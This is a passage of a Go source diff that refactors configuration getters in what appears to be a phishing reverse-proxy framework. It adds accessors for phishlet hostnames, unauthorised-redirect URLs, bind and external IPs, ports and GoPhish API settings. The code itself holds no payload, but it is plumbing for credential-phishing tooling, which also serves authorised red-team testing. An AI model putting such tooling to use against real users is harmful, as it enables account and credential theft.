 			}
 		}
 	}
@@ -515,30 +767,59 @@ func (c *Config) GetPhishletNames() []string {
 }
 
 func (c *Config) GetSiteDomain(site string) (string, bool) {
-	domain, ok := c.siteDomains[site]
-	return domain, ok
+	if o, ok := c.phishletConfig[site]; ok {
+		return o.Hostname, ok
+	}
+	return "", false
 }
 
-func (c *Config) GetAllDomains() []string {
-	var ret []string
-	for _, dom := range c.siteDomains {
-		ret = append(ret, dom)
+func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
+	if o, ok := c.phishletConfig[site]; ok {
+		return o.UnauthUrl, ok
 	}
-	return ret
+	return "", false
 }
 
 func (c *Config) GetBaseDomain() string {
-	return c.baseDomain
+	return c.general.Domain
 }
 
-func (c *Config) GetServerIP() string {
-	return c.serverIP
+func (c *Config) GetServerExternalIP() string {
+	return c.general.ExternalIpv4
 }
 
-func (c *Config) GetTemplatesDir() string {
-	return c.templatesDir
+func (c *Config) GetServerBindIP() string {
+	return c.general.BindIpv4
+}
+
+func (c *Config) GetHttpsPort() int {
+	return c.general.HttpsPort
+}
+
+func (c *Config) GetDnsPort() int {
+	return c.general.DnsPort
+}
+
+func (c *Config) GetRedirectorsDir() string {
+	return c.redirectorsDir
 }
 
 func (c *Config) GetBlacklistMode() string {
-	return c.blackListMode
+	return c.blacklistConfig.Mode
+}
+
+func (c *Config) IsAutocertEnabled() bool {
+	return c.general.Autocert
+}
+
+func (c *Config) GetGoPhishAdminUrl() string {
+	return c.gophishConfig.AdminUrl
+}
+
+func (c *Config) GetGoPhishApiKey() string {
+	return c.gophishConfig.ApiKey
+}
+
+func (c *Config) GetGoPhishInsecureTLS() bool {
+	return c.gophishConfig.InsecureTLS
 }
